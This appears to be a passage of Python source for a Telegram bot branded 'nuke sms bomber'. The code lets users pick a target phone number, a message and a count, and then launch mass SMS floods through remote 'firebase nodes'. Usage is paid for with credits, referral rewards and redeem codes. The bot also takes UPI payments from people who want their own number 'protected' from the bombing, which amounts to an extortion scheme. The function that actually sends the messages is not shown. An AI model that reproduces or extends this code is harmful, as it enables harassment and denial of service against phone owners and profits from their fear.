def build_upi_qr(upi_id: str, name: str, amount: float, note: str = "") -> Optional[bytes]:
    if not QR_AVAILABLE:
        return None
    try:
        upi_uri = f"upi://pay?pa={upi_id}&pn={note or name}&am={amount}&cu=INR"
        img = qrcode.make(upi_uri)
        buf = BytesIO()
        img.save(buf, format="PNG")
        return buf.getvalue()
    except Exception as e:
        log.error(f"QR build failed: {e}")
        return None


# ════════════════════════════════════════════════════════════════════
# ROUTER
# ════════════════════════════════════════════════════════════════════
R = Router()
_bot_username_cache: str = ""
_cb_rate: Dict[int, float] = {}


async def get_bot_username(bot: Bot) -> str:
    global _bot_username_cache
    if not _bot_username_cache:
        try:
            me = await bot.get_me()
            _bot_username_cache = me.username or ""
        except Exception:
            _bot_username_cache = ""
    return _bot_username_cache


def _rate_ok(uid: int) -> bool:
    now = time.time()
    last = _cb_rate.get(uid, 0)
    if now - last < 0.4:
        return False
    _cb_rate[uid] = now
    if len(_cb_rate) > 5000:
        cutoff = now - 300
        for k in [k for k, v in _cb_rate.items() if v < cutoff]:
            _cb_rate.pop(k, None)
    return True


async def _send_dashboard(bot: Bot, chat_id: int, uid: int,
                          edit: bool = False, msg_id: Optional[int] = None):
    d = load()
    rec = user_record(d, uid)
    credits = int(rec.get("credits", 0))
    referrals = int(rec.get("referrals", 0))
    tier = credit_tier(credits)

    bot_username = await get_bot_username(bot)
    invite_link = (f"https://t.me/{bot_username}?start=ref_{uid}"
                   if bot_username else f"ref_{uid}")

    text = (
        f"{DIV}\n"
        f"{ce('bomb')}  {B(sc('nuke sms bomber'))}  {ce('bomb')}\n"
        f"{DIV2}\n"
        f"{ce('crown')} {sc('rank')}      ·  {B(sc(tier))}\n"
        f"{ce('money')} {sc('balance')}   ·  {C(str(credits) + ' credits')}\n"
        f"{ce('referral')} {sc('referrals')} ·  {C(str(referrals))}\n"
        f"{DIV2}\n"
        f"{ce('pin')} {B(sc('your invite link'))}\n"
        f"{C(invite_link)}\n"
        f"{DIV2}\n"
        f"{ce('earn_credit')} {sc('earn')} {B(str(REFERRAL_REWARD) + ' credits')} {sc('per invited friend!')}\n"
        f"{DIV}"
    )
    markup = main_menu(uid, d)

    if edit and msg_id:
        if await safe_edit(bot, chat_id, msg_id, text, reply_markup=markup):
            return
    await safe_send(bot, chat_id, text, reply_markup=markup)


# ─── /start ─────────────────────────────────────────────────────────
@R.message(Command("start"))
async def cmd_start(msg: types.Message, state: FSMContext):
    try:
        await state.clear()
        uid = msg.from_user.id
        d = load()

        if not await check_fj(msg.bot, uid, FORCE_JOIN_CHANNELS):
            await send_fj_ui(msg, FORCE_JOIN_CHANNELS)
            return

        if is_banned(uid, d):
            await safe_send(msg.bot, msg.chat.id,
                f"{header('blocked', 'access denied')}{sc('you are banned from using this bot.')}")
            return

        parts = (msg.text or "").split(maxsplit=1)
        payload = parts[1].strip() if len(parts) > 1 else ""
        referrer_id = 0
        if payload.startswith("ref_"):
            try:
                candidate = int(payload[4:])
                if candidate != uid:
                    referrer_id = candidate
            except Exception:
                pass

        users = d.setdefault("users", {})
        is_new = str(uid) not in users

        if is_new:
            rec = user_record(d, uid)
            rec["credits"] = WELCOME_CREDITS
            rec["referred_by"] = referrer_id
            rec["is_new"] = False

            if referrer_id and str(referrer_id) in users:
                users[str(referrer_id)]["referrals"] = users[str(referrer_id)].get("referrals", 0) + 1
                add_credits(d, referrer_id, REFERRAL_REWARD)
                try:
                    await safe_send(msg.bot, referrer_id,
                        f"{header('launch', 'referral reward received!')}"
                        f"{ce('do_task')} {sc('a new user joined via your invite link.')}\n"
                        f"+{C(str(REFERRAL_REWARD) + ' credits')} {sc('added to your balance!')}")
                except Exception:
                    pass

        rec = user_record(d, uid)
        rec["username"] = msg.from_user.username or ""
        rec["first_name"] = msg.from_user.first_name or ""
        save(d)

        if is_new:
            await safe_send(msg.bot, msg.chat.id,
                f"{DIV}\n"
                f"{ce('launch')}  {B(sc('welcome to nuke bomber!'))}  {ce('launch')}\n"
                f"{DIV2}\n"
                f"{ce('gift')} {sc('welcome bonus')} · {C('+' + str(WELCOME_CREDITS) + ' credits')}\n"
                f"{ce('rocket')} {sc('you can send up to')} {B(str(WELCOME_CREDITS))} {sc('sms right away.')}\n"
                f"{DIV2}\n"
                f"{ce('earn_credit')} {sc('invite friends to earn')} {B(str(REFERRAL_REWARD))} {sc('credits each!')}\n"
                f"{DIV}")

        await _send_dashboard(msg.bot, msg.chat.id, uid, edit=False)
    except Exception as e:
        log.exception(f"cmd_start error: {e}")


@R.message(Command("stop"))
async def cmd_stop(msg: types.Message):
    try:
        if stop_bombing(msg.from_user.id):
            await safe_send(msg.bot, msg.chat.id,
                f"{header('stop', 'bombing stopped')}")
        else:
            await safe_send(msg.bot, msg.chat.id,
                f"{header('info', 'no active bombing to stop')}")
    except Exception as e:
        log.exception(f"cmd_stop error: {e}")


@R.message(Command("cancel"))
async def cmd_cancel(msg: types.Message, state: FSMContext):
    try:
        await state.clear()
        await safe_send(msg.bot, msg.chat.id,
            f"{header('verify', 'cancelled')}",
            reply_markup=main_menu(msg.from_user.id, load()))
    except Exception as e:
        log.exception(f"cmd_cancel error: {e}")


@R.callback_query(F.data == "noop")
async def cb_noop(cq: types.CallbackQuery):
    await safe_answer(cq)


@R.callback_query(F.data == "fj_verify")
async def cb_fj_verify(cq: types.CallbackQuery):
    try:
        if await check_fj(cq.bot, cq.from_user.id, FORCE_JOIN_CHANNELS):
            await safe_answer(cq, sc("verified!"))
            await _send_dashboard(cq.bot, cq.message.chat.id, cq.from_user.id,
                                  edit=True, msg_id=cq.message.message_id)
        else:
            await safe_answer(cq, sc("you haven't joined all channels yet!"), show_alert=True)
    except Exception as e:
        log.exception(f"fj_verify error: {e}")


@R.callback_query(F.data == "fj_restart")
async def cb_fj_restart(cq: types.CallbackQuery):
    try:
        await safe_answer(cq)
        await send_fj_ui(cq, FORCE_JOIN_CHANNELS)
    except Exception as e:
        log.exception(f"fj_restart error: {e}")


@R.callback_query(F.data == "home")
async def cb_home(cq: types.CallbackQuery, state: FSMContext):
    try:
        if not _rate_ok(cq.from_user.id):
            await safe_answer(cq); return
        await state.clear()
        uid = cq.from_user.id
        d = load()
        if not await check_fj(cq.bot, uid, FORCE_JOIN_CHANNELS):
            await send_fj_ui(cq, FORCE_JOIN_CHANNELS); return
        if is_banned(uid, d):
            await safe_answer(cq, sc("you are banned."), show_alert=True); return
        await safe_answer(cq)
        await _send_dashboard(cq.bot, cq.message.chat.id, uid,
                              edit=True, msg_id=cq.message.message_id)
    except Exception as e:
        log.exception(f"home error: {e}")


@R.callback_query(F.data == "referral:show")
async def cb_referral(cq: types.CallbackQuery, state: FSMContext):
    try:
        if not _rate_ok(cq.from_user.id):
            await safe_answer(cq); return
        await state.clear()
        uid = cq.from_user.id
        d = load()
        rec = user_record(d, uid)
        referrals = int(rec.get("referrals", 0))
        earned = referrals * REFERRAL_REWARD
        bot_username = await get_bot_username(cq.bot)
        invite_link = (f"https://t.me/{bot_username}?start=ref_{uid}"
                       if bot_username else f"ref_{uid}")

        text = (
            f"{DIV}\n"
            f"{ce('referral')}  {B(sc('refer & earn'))}  {ce('gift')}\n"
            f"{DIV2}\n"
            f"{ce('crown')} {B(sc('invite friends & earn rewards'))}\n"
            f"{sc('get')} {ce('earn_credit')} {C('+' + str(REFERRAL_REWARD) + ' credits')} {sc('per referral!')}\n"
            f"{DIV2}\n"
            f"{ce('star')} {sc('friends invited')} · {C(str(referrals))}\n"
            f"{ce('money')} {sc('total earned')}    · {C(str(earned) + ' credits')}\n"
            f"{DIV2}\n"
            f"{ce('pin')} {B(sc('your invite link'))}\n"
            f"{C(invite_link)}\n"
            f"{DIV2}\n"
            f"{ce('fire')} {sc('share to earn automatically.')}\n"
            f"{DIV}"
        )
        share_text = f"Join this SMS bomber bot and get 599 free credits! Use my link: {invite_link}"
        share_url = f"https://t.me/share/url?url={invite_link}&text={share_text}"
        markup = kb([
            [(sc("sʜᴀʀᴇ ɪɴᴠɪᴛᴇ ʟɪɴᴋ"), share_url, "success", "share")],
            [(sc("ʙᴀᴄᴋ"), "home", "danger", "back")],
        ])
        await safe_answer(cq)
        if not await safe_edit(cq.bot, cq.message.chat.id, cq.message.message_id,
                               text, reply_markup=markup):
            await safe_send(cq.bot, cq.message.chat.id, text, reply_markup=markup)
    except Exception as e:
        log.exception(f"referral error: {e}")


@R.callback_query(F.data == "help:show")
async def cb_help(cq: types.CallbackQuery, state: FSMContext):
    try:
        if not _rate_ok(cq.from_user.id):
            await safe_answer(cq); return
        await state.clear()
        await safe_answer(cq)
        text = (
            f"{DIV}\n"
            f"{ce('info')}  {B(sc('how to use this bot'))}\n"
            f"{DIV2}\n"
            f"{B('1')} · {sc('tap')} {B(sc('target bombing'))}\n"
            f"{B('2')} · {sc('enter the target number')} {C('+919876543210')}\n"
            f"{B('3')} · {sc('enter the message you want to send')}\n"
            f"{B('4')} · {sc('enter how many sms to send (max = your credits)')}\n"
            f"{B('5')} · {sc('engine dispatches across every online device')}\n"
            f"{DIV2}\n"
            f"{ce('credit')}  {B(sc('credits pricing'))}\n"
            f"  • 1 sms · {C('1 credit')}\n"
            f"  • new user bonus · {C(str(WELCOME_CREDITS) + ' credits')}\n"
            f"  • referral reward · {C(str(REFERRAL_REWARD) + ' credits')}\n"
            f"  • redeem a code to top-up instantly\n"
            f"{DIV2}\n"
            f"{ce('bolt')}  {B(sc('how many sms can i send?'))}\n"
            f"  • exactly as many as you have credits\n"
            f"  • 599 credits → 599 sms in one shot\n"
            f"  • devices are reused if needed to hit your full credit amount\n"
            f"{DIV}"
        )
        if not await safe_edit(cq.bot, cq.message.chat.id, cq.message.message_id,
                               text, reply_markup=back_button()):
            await safe_send(cq.bot, cq.message.chat.id, text, reply_markup=back_button())
    except Exception as e:
        log.exception(f"help error: {e}")


@R.callback_query(F.data == "stats:show")
async def cb_stats(cq: types.CallbackQuery, state: FSMContext):
    try:
        if not _rate_ok(cq.from_user.id):
            await safe_answer(cq); return
        await state.clear()
        uid = cq.from_user.id
        status = _bombing_status.get(uid, {})
        if status and status.get("running"):
            elapsed = int(time.time() - status.get("start", time.time()))
            text = (
                f"{header('bomb', 'active bombing')}"
                f"{ce('phone')} {sc('target')} · {C(str(status.get('number', '?')))}\n"
                f"{ce('verify')} {sc('sent')} · {B(str(status.get('sent', 0)))}\n"
                f"{ce('cross')} {sc('failed')} · {B(str(status.get('failed', 0)))}\n"
                f"{ce('bolt')} {sc('devices')} · {B(str(status.get('devices', 0)))}\n"
                f"{ce('chart')} {sc('elapsed')} · {C(str(elapsed) + 's')}"
            )
        else:
            d = load()
            rec = user_record(d, uid)
            gs = d.get("stats", {})
            text = (
                f"{header('chart', 'your stats')}"
                f"{ce('money')} {sc('credits')} · {C(str(rec.get('credits', 0)))}\n"
                f"{ce('referral')} {sc('referrals')} · {C(str(rec.get('referrals', 0)))}\n"
                f"{ce('bolt')} {sc('total nodes')} · {C(str(len(d.get('firebases', []))))}\n"
                f"{DIV2}\n"
                f"{ce('top')}  {B(sc('global stats'))}\n"
                f"{ce('verify')} {sc('total sent')}   · {C(str(gs.get('total_sent', 0)))}\n"
                f"{ce('cross')} {sc('total failed')} · {C(str(gs.get('total_failed', 0)))}\n"
                f"{ce('bomb')} {sc('bombings run')} · {C(str(gs.get('total_bombings', 0)))}"
            )
        await safe_answer(cq)
        if not await safe_edit(cq.bot, cq.message.chat.id, cq.message.message_id,
                               text, reply_markup=back_button()):
            await safe_send(cq.bot, cq.message.chat.id, text, reply_markup=back_button())
    except Exception as e:
        log.exception(f"stats error: {e}")


# ════════════════════════════════════════════════════════════════════
# REDEEM
# ════════════════════════════════════════════════════════════════════
@R.callback_query(F.data == "redeem:start")
async def cb_redeem_start(cq: types.CallbackQuery, state: FSMContext):
    try:
        await safe_answer(cq)
        await state.set_state(Form.redeem_code)
        text = (
            f"{DIV}\n"
            f"{ce('gift')}  {B(sc('redeem credits'))}  {ce('gift')}\n"
            f"{DIV2}\n"
            f"{sc('enter your redeem code below to get credits instantly.')}\n"
            f"{DIV2}\n"
            f"{ce('pin')} {It(sc('example'))} · {C('BOMB-A2C4F-7H9K3')}\n"
            f"{footer('use /cancel to abort')}"
        )
        if not await safe_edit(cq.bot, cq.message.chat.id, cq.message.message_id,
                               text, reply_markup=back_button("home")):
            await safe_send(cq.bot, cq.message.chat.id, text, reply_markup=back_button("home"))
    except Exception as e:
        log.exception(f"redeem start error: {e}")


@R.message(Form.redeem_code)
async def process_redeem_code(msg: types.Message, state: FSMContext):
    try:
        uid = msg.from_user.id
        raw = msg.text or ""
        code = normalize_code(raw)
        if not code:
            await safe_send(msg.bot, msg.chat.id, f"{header('cross', 'please send a valid code')}")
            return
        d = load()
        status, credits = redeem_code_for_user(d, uid, code)

        if status == "ok":
            save(d)
            new_balance = get_credits(d, uid)
            await state.clear()
            await safe_send(msg.bot, msg.chat.id,
                f"{header('verify', 'redeem successful!')}"
                f"{ce('gift')} {C('+' + str(credits) + ' credits')} {sc('added to your balance!')}\n"
                f"{ce('money')} {sc('new balance')} · {C(str(new_balance) + ' credits')}",
                reply_markup=main_menu(uid, d))
            return
        if status == "not_found":
            await safe_send(msg.bot, msg.chat.id,
                f"{header('cross', 'invalid code')}"
                f"{sc('this code does not exist. please check and try again.')}\n"
                f"{It(sc('use /cancel to abort'))}")
            return
        if status == "already_used":
            await state.clear()
            await safe_send(msg.bot, msg.chat.id,
                f"{header('cross', 'already redeemed')}"
                f"{sc('you have already used this code.')}",
                reply_markup=main_menu(uid, d))
            return
        if status == "exhausted":
            await state.clear()
            await safe_send(msg.bot, msg.chat.id,
                f"{header('blocked', 'code exhausted')}"
                f"{sc('this code has reached its maximum uses.')}",
                reply_markup=main_menu(uid, d))
            return
    except Exception as e:
        log.exception(f"redeem process error: {e}")


# ════════════════════════════════════════════════════════════════════
# BOMBING FLOW
# ════════════════════════════════════════════════════════════════════
@R.callback_query(F.data == "bomb:start")
async def cb_bomb_start(cq: types.CallbackQuery, state: FSMContext):
    try:
        uid = cq.from_user.id
        d = load()
        if not await check_fj(cq.bot, uid, FORCE_JOIN_CHANNELS):
            await send_fj_ui(cq, FORCE_JOIN_CHANNELS); return
        if not d.get("firebases"):
            await safe_answer(cq, sc("no firebase nodes configured."), show_alert=True); return
        credits = get_credits(d, uid)
        if credits <= 0:
            await safe_answer(cq, sc("0 credits — redeem a code or refer friends!"),
                              show_alert=True); return
        await state.set_state(Form.bomb_number)
        text = (
            f"{header('target', 'bombing — step 1/3')}"
            f"{ce('phone')} {sc('send the target phone number:')}\n\n"
            f"{sc('example')} · {C('+919876543210')}\n"
            f"{DIV2}\n"
            f"{ce('money')} {sc('your balance')} · {C(str(credits) + ' credits')}\n"
            f"{It(sc('use /cancel to abort'))}"
        )
        await safe_answer(cq)
        if not await safe_edit(cq.bot, cq.message.chat.id, cq.message.message_id,
                               text, reply_markup=back_button("home")):
            await safe_send(cq.bot, cq.message.chat.id, text, reply_markup=back_button("home"))
    except Exception as e:
        log.exception(f"bomb start error: {e}")


@R.message(Form.bomb_number)
async def process_number(msg: types.Message, state: FSMContext):
    try:
        if not msg.text:
            await safe_send(msg.bot, msg.chat.id, sc("please send the number.")); return
        number = msg.text.strip().replace(" ", "").replace("-", "")
        if not re.match(r'^\+?[0-9]{8,15}$', number):
            await safe_send(msg.bot, msg.chat.id,
                f"{header('cross', 'invalid number')}{sc('example')} · {C('+919876543210')}")
            return
        d = load()
        if number in d.get("protected_numbers", []):
            await safe_send(msg.bot, msg.chat.id,
                f"{header('shield', 'number protected')}"
                f"{ce('blocked')} {sc('this number is protected. the bot will not target it.')}")
            await state.clear()
            return
        await state.update_data(number=number)
        await state.set_state(Form.bomb_message)
        await safe_send(msg.bot, msg.chat.id,
            f"{header('smm', 'bombing — step 2/3')}"
            f"{sc('send the message text that will be delivered in every sms.')}",
            reply_markup=back_button("home"))
    except Exception as e:
        log.exception(f"process_number error: {e}")


@R.message(Form.bomb_message)
async def process_message(msg: types.Message, state: FSMContext):
    try:
        message = (msg.text or "").strip()
        if not message:
            await safe_send(msg.bot, msg.chat.id, sc("message cannot be empty!")); return
        if len(message) > 500:
            message = message[:500]
        await state.update_data(message=message)
        await state.set_state(Form.bomb_count)
        d = load()
        credits = get_credits(d, msg.from_user.id)
        await safe_send(msg.bot, msg.chat.id,
            f"{header('bolt', 'bombing — step 3/3')}"
            f"{sc('how many sms to send?')}\n"
            f"{ce('money')} {sc('your credits')} · {C(str(credits))}\n"
            f"{DIV2}\n"
            f"{It(sc('1 credit = 1 sms. you can send up to your full balance.'))}",
            reply_markup=back_button("home"))
    except Exception as e:
        log.exception(f"process_message error: {e}")


@R.message(Form.bomb_count)
async def process_count(msg: types.Message, state: FSMContext):
    try:
        try:
            count = int((msg.text or "").strip())
            if count < 1:
                await safe_send(msg.bot, msg.chat.id,
                    f"{header('cross', 'please send a number of at least 1')}")
                return
        except Exception:
            await safe_send(msg.bot, msg.chat.id,
                f"{header('cross', 'please send a valid number!')}")
            return

        uid = msg.from_user.id
        d = load()
        credits = get_credits(d, uid)
        if count > credits:
            await safe_send(msg.bot, msg.chat.id,
                f"{header('blocked', 'not enough credits')}"
                f"{sc('you requested')} · {C(str(count))} {sc('sms')}\n"
                f"{sc('your credits')} · {C(str(credits))}\n"
                f"{DIV2}\n"
                f"{sc('please enter a number between')} {C('1')} {sc('and')} {C(str(credits))}\n"
                f"{It(sc('or use /cancel to abort'))}")
            return

        data = await state.get_data()
        number = data.get("number")
        message = data.get("message")
        if not number or not message:
            await state.clear()
            await safe_send(msg.bot, msg.chat.id,
                f"{header('cross', 'session expired')}{sc('please start again.')}",
                reply_markup=main_menu(uid, d))
            return

        await safe_send(msg.bot, msg.chat.id,
            f"{header('pin', 'order confirmation')}"
            f"{ce('phone')} {sc('target')} · {C(number)}\n"
            f"{ce('smm')} {sc('message')} · {C(message[:40] + ('...' if len(message) > 40 else ''))}\n"
            f"{ce('bolt')} {sc('count')} · {B(str(count))}\n"
            f"{ce('money')} {sc('your credits')} · {C(str(credits))}\n"
            f"{DIV2}\n"
            f"{ce('verify')} {sc('confirm to start bombing')}",
            reply_markup=kb([
                [(sc("ʟᴀᴜɴᴄʜ ʙᴏᴍʙɪɴɢ"), f"bomb:confirm|{number}|{count}", "success", "rocket")],
                [(sc("ʙᴀᴄᴋ"), "home", "danger", "back")],
            ]))
        await state.update_data(bomb_message=message)
    except Exception as e:
        log.exception(f"process_count error: {e}")


@R.callback_query(F.data.startswith("bomb:confirm|"))
async def cb_bomb_confirm(cq: types.CallbackQuery, state: FSMContext):
    try:
        parts = cq.data.split("|")
        if len(parts) < 3:
            await safe_answer(cq, sc("invalid order data."), show_alert=True); return
        number = parts[1]
        try:
            count = int(parts[2])
        except Exception:
            await safe_answer(cq, sc("invalid count."), show_alert=True); return

        data = await state.get_data()
        message = data.get("bomb_message") or data.get("message") or "Hello!"
        await state.clear()

        await safe_answer(cq, sc("launching..."))
        await safe_delete(cq.bot, cq.message.chat.id, cq.message.message_id)
        await start_bombing(cq.bot, cq.from_user.id, number, message, count)
    except Exception as e:
        log.exception(f"bomb confirm error: {e}")


# ════════════════════════════════════════════════════════════════════
# PROTECTION FLOW
# ════════════════════════════════════════════════════════════════════
@R.callback_query(F.data == "protect:start")
async def cb_protect_start(cq: types.CallbackQuery, state: FSMContext):
    try:
        await state.clear()
        await safe_answer(cq)
        header_text = (
            f"{DIV}\n"
            f"{ce('shield')}  {B(sc('number protection'))}\n"
            f"{DIV2}\n"
            f"{ce('bolt')} {sc('get your number protected from the bombing service.')}\n\n"
            f"{ce('money')} {sc('price')} · {B(PROTECTION_PRICE)}\n"
            f"{ce('credit')} {sc('pay to upi')} · {C(PAYMENT_UPI)}\n"
            f"{DIV2}\n"
            f"{sc('scan the qr code below with any upi app (phonepe / gpay / paytm)')}\n"
            f"{sc('after payment, tap')} {B(sc('i have paid'))} {sc('to submit your transaction id.')}\n"
            f"{DIV}"
        )
        markup = kb([
            [(sc("ɪ ʜᴀᴠᴇ ᴘᴀɪᴅ"), "protect:paid", "success", "verify")],
            [(sc("ʙᴀᴄᴋ"), "home", "danger", "back")],
        ])
        qr_bytes = build_upi_qr(PAYMENT_UPI, PAYMENT_NAME, amount=10, note="Number Protection")
        sent_photo = False
        if qr_bytes:
            await safe_delete(cq.bot, cq.message.chat.id, cq.message.message_id)
            try:
                photo = BufferedInputFile(qr_bytes, filename="protection_qr.png")
                await cq.bot.send_photo(cq.message.chat.id, photo, caption=header_text,
                                        parse_mode=ParseMode.HTML, reply_markup=markup)
                sent_photo = True
            except Exception as e:
                log.error(f"QR send failed: {e}")

        if not sent_photo:
            fallback = header_text + (
                f"\n{It(sc('qr image unavailable — pay directly to the upi id above.'))}\n"
                if not QR_AVAILABLE
                else f"\n{It(sc('qr could not be generated. use the upi id above.'))}\n"
            )
            if not await safe_edit(cq.bot, cq.message.chat.id, cq.message.message_id,
                                   fallback, reply_markup=markup):
                await safe_send(cq.bot, cq.message.chat.id, fallback, reply_markup=markup)
    except Exception as e:
        log.exception(f"protect start error: {e}")


@R.callback_query(F.data == "protect:paid")
async def cb_protect_paid(cq: types.CallbackQuery, state: FSMContext):
    try:
        await safe_answer(cq)
        await state.set_state(Form.protect_utr)
        text = (
            f"{header('verify', 'submit transaction id')}"
            f"{sc('paste your upi transaction / utr reference below.')}\n"
            f"{It(sc('example'))} · {C('T123456789012')}"
        )
        if not await safe_edit(cq.bot, cq.message.chat.id, cq.message.message_id,
                               text, reply_markup=back_button("home")):
            await safe_send(cq.bot, cq.message.chat.id, text, reply_markup=back_button("home"))
    except Exception as e:
        log.exception(f"protect paid error: {e}")


@R.message(Form.protect_utr)
async def process_protect_utr(msg: types.Message, state: FSMContext):
    try:
        utr = (msg.text or "").strip()
        if len(utr) < 5 or len(utr) > 60:
            await safe_send(msg.bot, msg.chat.id,
                f"{header('cross', 'invalid transaction id')}"); return
        await state.update_data(utr=utr)
        await state.set_state(Form.protect_number)
        await safe_send(msg.bot, msg.chat.id,
            f"{header('phone', 'enter number')}"
            f"{sc('the number you want protected')}\n\n"
            f"{sc('example')} · {C('+919876543210')}",
            reply_markup=back_button("home"))
    except Exception as e:
        log.exception(f"protect utr error: {e}")


@R.message(Form.protect_number)
async def process_protect_number(msg: types.Message, state: FSMContext):
    try:
        number = (msg.text or "").strip().replace(" ", "").replace("-", "")
        if not re.match(r'^\+?[0-9]{8,15}$', number):
            await safe_send(msg.bot, msg.chat.id,
                f"{header('cross', 'invalid number')}{sc('example')} · {C('+919876543210')}")
            return

        data = await state.get_data()
        utr = data.get("utr") or "unknown"
        uid = msg.from_user.id
        username = msg.from_user.username or msg.from_user.first_name or "unknown"

        d = load()
        req_id = str(int(time.time() * 1000))
        d["protection_requests"].append({
            "id": req_id, "user_id": uid, "username": username,
            "number": number, "txn_id": utr,
            "status": "pending", "time": datetime.now().isoformat(),
        })
        save(d)
        await state.clear()

        await safe_send(msg.bot, msg.chat.id,
            f"{header('verify', 'protection request submitted')}"
            f"{sc('your request is now with the admins for verification.')}\n"
            f"{sc('you will be notified once approved.')}")

        admin_text = (
            f"{header('shield', 'new protection request')}"
            f"{ce('do_task')} {sc('user')}   · {C(str(uid))} (@{username})\n"
            f"{ce('phone')} {sc('number')} · {C(number)}\n"
            f"{ce('credit')} {sc('utr')}    · {C(utr)}"
        )
        kb_rows = [
            [(sc("ᴀᴘᴘʀᴏᴠᴇ"), f"admin:prot_approve:{req_id}", "success", "verify")],
            [(sc("ʀᴇᴊᴇᴄᴛ"), f"admin:prot_reject:{req_id}", "danger", "cross")],
        ]
        admins_to_notify = set(d.get("admins", []))
        admins_to_notify.add(OWNER_ID)
        for admin_id in admins_to_notify:
            try:
                await safe_send(msg.bot, admin_id, admin_text, reply_markup=kb(kb_rows))
            except Exception:
                pass
    except Exception as e:
        log.exception(f"protect number error: {e}")


# ════════════════════════════════════════════════════════════════════
# ADMIN PANEL
# ════════════════════════════════════════════════════════════════════
async def _render_admin_panel(cq: types.CallbackQuery):
    d = load()
    pending_reqs = len([r for r in d.get("protection_requests", [])
                        if r.get("status") == "pending"])
    total_codes = len(d.get("redeem_codes", {}))
    text = (
        f"{DIV}\n"
        f"{ce('crown')}  {B(sc('admin panel'))}\n"
        f"{DIV2}\n"
        f"{ce('fire')} {sc('nodes')}       · {C(str(len(d.get('firebases', []))))}\n"
        f"{ce('shield')} {sc('protection')} · {C(str(pending_reqs))}\n"
        f"{ce('gift')} {sc('codes')}      · {C(str(total_codes))}\n"
        f"{ce('crown')} {sc('admins')}     · {C(str(len(d.get('admins', []))))}\n"
        f"{ce('blocked')} {sc('banned')}   · {C(str(len(d.get('banned', []))))}\n"
        f"{ce('do_task')} {sc('users')}    · {C(str(len(d.get('users', {}))))}\n"
        f"{DIV}"
    )
    if not await safe_edit(cq.bot, cq.message.chat.id, cq.message.message_id,
                           text, reply_markup=admin_panel_kb(d)):
        await safe_send(cq.bot, cq.message.chat.id, text, reply_markup=admin_panel_kb(d))


@R.callback_query(F.data == "admin:panel")
async def cb_admin_panel(cq: types.CallbackQuery, state: FSMContext):
    try:
        await state.clear()
        d = load()
        if not is_admin(cq.from_user.id, d):
            await safe_answer(cq, sc("access denied!"), show_alert=True); return
        await safe_answer(cq)
        await _render_admin_panel(cq)
    except Exception as e:
        log.exception(f"admin panel error: {e}")


@R.callback_query(F.data == "admin:stats")
async def cb_admin_stats(cq: types.CallbackQuery, state: FSMContext):
    try:
        await state.clear()
        d = load()
        if not is_admin(cq.from_user.id, d):
            await safe_answer(cq, sc("access denied"), show_alert=True); return
        gs = d.get("stats", {})
        total = gs.get("total_sent", 0) + gs.get("total_failed", 0)
        rate = round(gs.get("total_sent", 0) / total * 100, 1) if total else 0
        users = d.get("users", {})
        total_credits = sum(int(u.get("credits", 0)) for u in users.values())
        pending = len([r for r in d.get("protection_requests", [])
                       if r.get("status") == "pending"])
        text = (
            f"{header('chart', 'global stats')}"
            f"{ce('do_task')} {sc('users')}       · {C(str(len(users)))}\n"
            f"{ce('money')} {sc('credits circ')} · {C(str(total_credits))}\n"
            f"{ce('gift')} {sc('codes')}      · {C(str(len(d.get('redeem_codes', {}))))}\n"
            f"{ce('fire')} {sc('nodes')}       · {C(str(len(d.get('firebases', []))))}\n"
            f"{ce('shield')} {sc('pending')}   · {C(str(pending))}\n"
            f"{ce('blocked')} {sc('banned')}   · {C(str(len(d.get('banned', []))))}\n"
            f"{DIV2}\n"
            f"{ce('verify')} {sc('total sent')}   · {C(str(gs.get('total_sent', 0)))}\n"
            f"{ce('cross')} {sc('total failed')} · {C(str(gs.get('total_failed', 0)))}\n"
            f"{ce('bomb')} {sc('bombings')}     · {C(str(gs.get('total_bombings', 0)))}\n"
            f"{ce('top')} {sc('success rate')}  · {B(str(rate) + '%')}"
        )
        await safe_answer(cq)
        if not await safe_edit(cq.bot, cq.message.chat.id, cq.message.message_id,
                               text, reply_markup=back_button("admin:panel")):
            await safe_send(cq.bot, cq.message.chat.id, text,
                            reply_markup=back_button("admin:panel"))
    except Exception as e:
        log.exception(f"admin stats error: {e}")


# ─── Admin: create redeem code ──────────────────────────────────────
@R.callback_query(F.data == "admin:create_code")
async def cb_admin_create_code(cq: types.CallbackQuery, state: FSMContext):
    try:
        d = load()
        if not is_admin(cq.from_user.id, d):
            await safe_answer(cq, sc("access denied"), show_alert=True); return
        await state.set_state(Form.admin_code_credits)
        text = (
            f"{header('gift', 'create redeem code')}"
            f"{sc('step 1/2 · how many credits should this code give per user?')}\n"
            f"{DIV2}\n"
            f"{It(sc('example'))} · {C('100')}\n"
            f"{It(sc('use /cancel to abort'))}"
        )
        await safe_answer(cq)
        if not await safe_edit(cq.bot, cq.message.chat.id, cq.message.message_id,
                               text, reply_markup=back_button("admin:panel")):
            await safe_send(cq.bot, cq.message.chat.id, text,
                            reply_markup=back_button("admin:panel"))
    except Exception as e:
        log.exception(f"create code error: {e}")


@R.message(Form.admin_code_credits)
async def process_admin_code_credits(msg: types.Message, state: FSMContext):
    try:
        d = load()
        if not is_admin(msg.from_user.id, d): return
        raw = (msg.text or "").strip().replace("+", "")
        if not raw.isdigit() or int(raw) < 1:
            await safe_send(msg.bot, msg.chat.id,
                f"{header('cross', 'please send a whole number of at least 1')}"); return
        credits = int(raw)
        await state.update_data(code_credits=credits)
        await state.set_state(Form.admin_code_uses)
        await safe_send(msg.bot, msg.chat.id,
            f"{header('gift', 'create redeem code')}"
            f"{sc('step 2/2 · how many users can redeem this code?')}\n"
            f"{DIV2}\n"
            f"{ce('credit')} {sc('credits per user')} · {C(str(credits))}\n"
            f"{It(sc('example'))} · {C('5')}\n"
            f"{It(sc('use /cancel to abort'))}",
            reply_markup=back_button("admin:panel"))
    except Exception as e:
        log.exception(f"code credits error: {e}")


@R.message(Form.admin_code_uses)
async def process_admin_code_uses(msg: types.Message, state: FSMContext):
    try:
        d = load()
        if not is_admin(msg.from_user.id, d): return
        raw = (msg.text or "").strip().replace("+", "")
        if not raw.isdigit() or int(raw) < 1:
            await safe_send(msg.bot, msg.chat.id,
                f"{header('cross', 'please send a whole number of at least 1')}"); return
        max_uses = int(raw)
        data = await state.get_data()
        credits = int(data.get("code_credits", 0))
        if credits < 1:
            await state.clear()
            await safe_send(msg.bot, msg.chat.id,
                f"{header('cross', 'session expired')}{sc('please start again.')}",
                reply_markup=back_button("admin:panel"))
            return
        d = load()
        code = create_redeem_code_record(d, credits, max_uses, msg.from_user.id)
        save(d)
        await state.clear()
        await safe_send(msg.bot, msg.chat.id,
            f"{header('verify', 'redeem code created')}"
            f"{ce('gift')} {B(sc('code'))}\n"
            f"{C(code)}\n"
            f"{DIV2}\n"
